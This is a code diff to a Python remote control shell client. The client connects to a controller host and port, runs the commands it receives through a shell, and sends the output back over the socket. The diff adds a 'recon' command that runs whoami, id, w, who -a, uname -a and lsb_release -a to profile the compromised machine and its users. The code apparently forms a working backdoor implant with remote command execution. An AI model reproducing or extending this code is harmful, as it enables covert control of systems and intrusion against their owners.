@@ -46,17 +46,30 @@ def ctrl_shell_client(host, port):
         if inp == 'fin':
             break
         elif re.search('^exec ("[^"]+"\ )+$', inp + ' '):
-            ctrl_shell_exec(s, inp)
+            socksend(s, ctrl_shell_exec(inp))
+        elif inp == 'recon':
+            socksend(s, ctrl_shell_recon())
     s.close()
 
 
-def ctrl_shell_exec(s, inp):
-    stdout = ''
+def ctrl_shell_exec(inp):
+    out = ''
     cmds = parse_exec_cmds(inp)
     for cmd in cmds:
-        cmd_out = sp.Popen(cmd, stdout=sp.PIPE, shell=True).communicate()[0]
-        stdout += '==========\n\n$ {}\n{}\n'.format(cmd, cmd_out)
-    socksend(s, stdout)
+        cmd_out = cmd_exec(cmd)
+        out += '='*20 + '\n\n$ {}\n{}\n'.format(cmd, cmd_out)
+    return out
+
+
+def ctrl_shell_recon():
+    ts = str(datetime.now())
+    exec_str = 'exec "whoami" "id" "w" "who -a" "uname -a" "lsb_release -a"'
+    out = ctrl_shell_exec(exec_str)
+    return '{}\n\n{}'.format(ts, out)
+
+
+def cmd_exec(cmd):
+    return sp.Popen(cmd, stdout=sp.PIPE, shell=True).communicate()[0]
 
 
 def socksend(s, msg):
@@ -109,8 +122,9 @@ def parse_exec_cmds(inp):
         first = inp.find('"')
         second = inp.find('"', first+1)
         cmd = inp[first+1:second]
-        cmds.append(cmd)
         inp = inp[second+2:]
+        if cmd_exec('which ' + cmd.split()[0]):
+            cmds.append(cmd)
     return cmds
 
 
